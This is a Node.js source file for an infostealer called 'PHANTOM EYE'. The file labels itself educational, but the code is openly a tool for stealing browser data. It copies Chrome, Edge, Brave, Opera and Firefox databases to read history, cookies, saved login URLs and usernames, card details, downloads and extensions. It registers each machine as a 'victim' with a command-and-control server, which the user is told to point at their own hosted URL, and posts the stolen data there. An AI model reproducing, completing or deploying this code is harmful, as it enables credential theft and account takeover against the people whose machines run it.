// ================================================
// PHANTOM EYE - Browser Data Extraction Tool
// Educational Use Only - Extracts browser data
// ================================================

const os = require('os');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

// ================================================
// CONFIGURATION - CHANGE THIS TO YOUR RAILWAY URL
// ================================================
const CONFIG = {
    c2: {
        url: 'http://localhost:3001',  // ← CHANGE TO YOUR RAILWAY URL
        register: '/api/register',
        data: '/api/data'
    }
};

// ================================================
// MAIN EXTRACTOR CLASS
// ================================================
class PhantomEye {
    constructor() {
        this.victimId = null;
        this.extractedData = {};
        this.totalSize = 0;
        this.browserPaths = this.getBrowserPaths();
        this.dataTypes = [];
    }

    async start() {
        console.log('👁️ PHANTOM EYE ACTIVATED');
        console.log('📊 Scanning for browser data...');
        
        // 1. Register with C2
        await this.registerWithC2();
        
        // 2. Extract data from all browsers
        await this.extractAllData();
        
        // 3. Send data to C2
        await this.sendDataToC2();
        
        // 4. Generate report
        this.generateReport();
        
        console.log('✅ DATA EXTRACTION COMPLETE');
        console.log(`📊 Total Data: ${(this.totalSize / 1024).toFixed(2)} KB`);
    }

    // ================================================
    // GET BROWSER PATHS
    // ================================================
    getBrowserPaths() {
        const userProfile = os.homedir();
        const paths = [];

        if (process.platform === 'win32') {
            // Chrome
            const chromePath = path.join(userProfile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
            if (fs.existsSync(chromePath)) {
                paths.push({ name: 'Chrome', path: chromePath });
            }

            // Edge
            const edgePath = path.join(userProfile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data');
            if (fs.existsSync(edgePath)) {
                paths.push({ name: 'Edge', path: edgePath });
            }

            // Brave
            const bravePath = path.join(userProfile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data');
            if (fs.existsSync(bravePath)) {
                paths.push({ name: 'Brave', path: bravePath });
            }

            // Opera
            const operaPath = path.join(userProfile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable');
            if (fs.existsSync(operaPath)) {
                paths.push({ name: 'Opera', path: operaPath });
            }

            // Firefox
            const firefoxPath = path.join(userProfile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
            if (fs.existsSync(firefoxPath)) {
                const profiles = fs.readdirSync(firefoxPath);
                profiles.forEach(profile => {
                    if (profile.endsWith('.default') || profile.endsWith('.default-release')) {
                        paths.push({ name: 'Firefox', path: path.join(firefoxPath, profile) });
                    }
                });
            }
        }

        return paths;
    }

    // ================================================
    // C2 COMMUNICATION
    // ================================================
    async registerWithC2() {
        try {
            const response = await fetch(CONFIG.c2.url + CONFIG.c2.register, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    computer_name: os.hostname(),
                    username: os.userInfo().username,
                    os: os.platform() + ' ' + os.release()
                })
            });
            const data = await response.json();
            if (data.success) {
                this.victimId = data.victimId;
                console.log('✅ Registered:', this.victimId);
            }
        } catch (e) {
            console.log('⚠️ C2 registration failed');
            this.victimId = 'V-' + Date.now().toString(36).toUpperCase();
        }
    }

    // ================================================
    // EXTRACT ALL DATA
    // ================================================
    async extractAllData() {
        console.log('🔍 Extracting browser data...');
        this.extractedData = {
            system: this.getSystemInfo(),
            browsers: {}
        };

        for (const browser of this.browserPaths) {
            console.log(`📂 Processing: ${browser.name}`);
            this.extractedData.browsers[browser.name] = await this.extractBrowserData(browser);
        }

        this.totalSize = JSON.stringify(this.extractedData).length;
    }

    // ================================================
    // GET SYSTEM INFO
    // ================================================
    getSystemInfo() {
        return {
            hostname: os.hostname(),
            username: os.userInfo().username,
            platform: os.platform(),
            release: os.release(),
            arch: os.arch(),
            cpus: os.cpus().length,
            memory: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
            uptime: (os.uptime() / 3600).toFixed(2) + ' hours',
            timestamp: new Date().toISOString()
        };
    }

    // ================================================
    // EXTRACT BROWSER DATA
    // ================================================
    async extractBrowserData(browser) {
        const data = {
            history: [],
            cookies: [],
            bookmarks: [],
            downloads: [],
            passwords: [],
            credit_cards: [],
            extensions: []
        };

        try {
            // Find the default profile
            let profilePath = browser.path;
            const defaultProfiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3'];
            for (const profile of defaultProfiles) {
                const testPath = path.join(browser.path, profile);
                if (fs.existsSync(testPath)) {
                    profilePath = testPath;
                    break;
                }
            }

            // 1. Extract History
            data.history = await this.extractHistory(profilePath);
            console.log(`  📜 History: ${data.history.length} entries`);

            // 2. Extract Cookies
            data.cookies = await this.extractCookies(profilePath);
            console.log(`  🍪 Cookies: ${data.cookies.length} entries`);

            // 3. Extract Bookmarks
            data.bookmarks = await this.extractBookmarks(profilePath);
            console.log(`  📑 Bookmarks: ${data.bookmarks.length} entries`);

            // 4. Extract Downloads
            data.downloads = await this.extractDownloads(profilePath);
            console.log(`  📥 Downloads: ${data.downloads.length} entries`);

            // 5. Extract Passwords
            data.passwords = await this.extractPasswords(profilePath);
            console.log(`  🔑 Passwords: ${data.passwords.length} entries`);

            // 6. Extract Credit Cards
            data.credit_cards = await this.extractCreditCards(profilePath);
            console.log(`  💳 Credit Cards: ${data.credit_cards.length} entries`);

            // 7. Extract Extensions
            data.extensions = await this.extractExtensions(profilePath);
            console.log(`  🔌 Extensions: ${data.extensions.length} entries`);

        } catch (e) {
            console.log(`⚠️ Error extracting ${browser.name}:`, e.message);
        }

        return data;
    }

    // ================================================
    // EXTRACT HISTORY
    // ================================================
    async extractHistory(profilePath) {
        const history = [];
        const historyDbPath = path.join(profilePath, 'History');
        
        if (!fs.existsSync(historyDbPath)) return history;

        try {
            const tempDb = path.join(os.tmpdir(), 'history_temp.db');
            fs.copyFileSync(historyDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT url, title, visit_count, last_visit_time 
                     FROM urls ORDER BY last_visit_time DESC LIMIT 500`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                history.push({
                                    url: row.url,
                                    title: row.title || 'No title',
                                    visits: row.visit_count || 0,
                                    last_visit: row.last_visit_time ? new Date(row.last_visit_time / 1000).toISOString() : null
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return history;
    }

    // ================================================
    // EXTRACT COOKIES
    // ================================================
    async extractCookies(profilePath) {
        const cookies = [];
        const cookiesDbPath = path.join(profilePath, 'Cookies');
        
        if (!fs.existsSync(cookiesDbPath)) return cookies;

        try {
            const tempDb = path.join(os.tmpdir(), 'cookies_temp.db');
            fs.copyFileSync(cookiesDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT host_key, name, value, path, expires_utc, is_secure 
                     FROM cookies ORDER BY host_key`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                cookies.push({
                                    domain: row.host_key,
                                    name: row.name,
                                    value: row.value || '[encrypted]',
                                    path: row.path,
                                    expires: row.expires_utc ? new Date(row.expires_utc / 1000).toISOString() : null,
                                    secure: row.is_secure === 1
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return cookies;
    }

    // ================================================
    // EXTRACT BOOKMARKS
    // ================================================
    async extractBookmarks(profilePath) {
        const bookmarks = [];
        const bookmarksPath = path.join(profilePath, 'Bookmarks');
        
        if (!fs.existsSync(bookmarksPath)) return bookmarks;

        try {
            const data = fs.readFileSync(bookmarksPath, 'utf8');
            const parsed = JSON.parse(data);
            
            if (parsed.roots) {
                const root = parsed.roots.bookmark_bar || parsed.roots.other || parsed.roots;
                if (root.children) {
                    const extractChildren = (children, folder = '') => {
                        children.forEach(child => {
                            if (child.type === 'url') {
                                bookmarks.push({
                                    name: child.name,
                                    url: child.url,
                                    folder: folder || 'Root'
                                });
                            } else if (child.type === 'folder' && child.children) {
                                const newFolder = folder ? `${folder}/${child.name}` : child.name;
                                extractChildren(child.children, newFolder);
                            }
                        });
                    };
                    extractChildren(root.children);
                }
            }
        } catch (e) {}

        return bookmarks;
    }

    // ================================================
    // EXTRACT DOWNLOADS
    // ================================================
    async extractDownloads(profilePath) {
        const downloads = [];
        const downloadsDbPath = path.join(profilePath, 'History');
        
        if (!fs.existsSync(downloadsDbPath)) return downloads;

        try {
            const tempDb = path.join(os.tmpdir(), 'downloads_temp.db');
            fs.copyFileSync(downloadsDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT target_path, start_time, end_time, total_bytes 
                     FROM downloads ORDER BY start_time DESC LIMIT 200`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                downloads.push({
                                    path: row.target_path || 'Unknown',
                                    start_time: row.start_time ? new Date(row.start_time / 1000).toISOString() : null,
                                    end_time: row.end_time ? new Date(row.end_time / 1000).toISOString() : null,
                                    size: row.total_bytes || 0
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return downloads;
    }

    // ================================================
    // EXTRACT PASSWORDS
    // ================================================
    async extractPasswords(profilePath) {
        const passwords = [];
        const loginDbPath = path.join(profilePath, 'Login Data');
        
        if (!fs.existsSync(loginDbPath)) return passwords;

        try {
            const tempDb = path.join(os.tmpdir(), 'passwords_temp.db');
            fs.copyFileSync(loginDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT origin_url, username_value, password_value, date_created 
                     FROM logins ORDER BY date_created DESC`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                passwords.push({
                                    url: row.origin_url,
                                    username: row.username_value || '',
                                    password: '[ENCRYPTED - Use decrypt tool]',
                                    created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return passwords;
    }

    // ================================================
    // EXTRACT CREDIT CARDS
    // ================================================
    async extractCreditCards(profilePath) {
        const cards = [];
        const cardsDbPath = path.join(profilePath, 'Web Data');
        
        if (!fs.existsSync(cardsDbPath)) return cards;

        try {
            const tempDb = path.join(os.tmpdir(), 'cards_temp.db');
            fs.copyFileSync(cardsDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year 
                     FROM credit_cards`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                cards.push({
                                    name: row.name_on_card || '',
                                    number: '[ENCRYPTED]',
                                    expiry_month: row.expiration_month,
                                    expiry_year: row.expiration_year
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return cards;
    }

    // ================================================
    // EXTRACT EXTENSIONS
    // ================================================
    async extractExtensions(profilePath) {
        const extensions = [];
        const extensionsPath = path.join(profilePath, 'Extensions');
        
        if (!fs.existsSync(extensionsPath)) return extensions;

        try {
            const items = fs.readdirSync(extensionsPath);
            for (const item of items) {
                const itemPath = path.join(extensionsPath, item);
                const manifestPath = path.join(itemPath, 'manifest.json');
                if (fs.existsSync(manifestPath)) {
                    try {
                        const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
                        extensions.push({
                            id: item,
                            name: manifest.name || 'Unknown',
                            version: manifest.version || 'Unknown',
                            description: manifest.description || '',
                            permissions: manifest.permissions || []
                        });
                    } catch (e) {}
                }
            }
        } catch (e) {}

        return extensions;
    }

    // ================================================
    // SEND DATA TO C2
    // ================================================
    async sendDataToC2() {
        if (!this.victimId) return;

        try {
            console.log('📤 Sending extracted data to C2...');
            
            // Send system info
            await this.sendDataChunk('system', this.extractedData.system);

            // Send browser data
            for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
                for (const [dataType, data] of Object.entries(browserData)) {
                    if (data && data.length > 0) {
                        await this.sendDataChunk(`${browserName}_${dataType}`, data);
                    }
                }
            }

            console.log('✅ Data sent to C2');
        } catch (e) {
            console.log('⚠️ Failed to send data:', e.message);
        }
    }

    async sendDataChunk(dataType, data) {
        try {
            await fetch(CONFIG.c2.url + CONFIG.c2.data, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: dataType,
                    data: data
                })
            });
            console.log(`📤 Sent: ${dataType} (${JSON.stringify(data).length} bytes)`);
        } catch (e) {
            console.log(`⚠️ Failed to send ${dataType}:`, e.message);
        }
    }

    // ================================================
    // GENERATE REPORT
    // ================================================
    generateReport() {
        console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   👁️ PHANTOM EYE - EXTRACTION REPORT                       ║
║                                                               ║
║   🆔 Victim ID: ${this.victimId}                                      ║
║   💻 Computer: ${os.hostname()}                                   ║
║   👤 User: ${os.userInfo().username}                                    ║
║                                                               ║
║   📊 Total Data: ${(this.totalSize / 1024).toFixed(2)} KB                     ║
║                                                               ║
║   📂 Browsers Found: ${this.browserPaths.length}                          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
        `);
    }
}

// ================================================
// START
// ================================================
const extractor = new PhantomEye();
extractor.start().catch(console.error);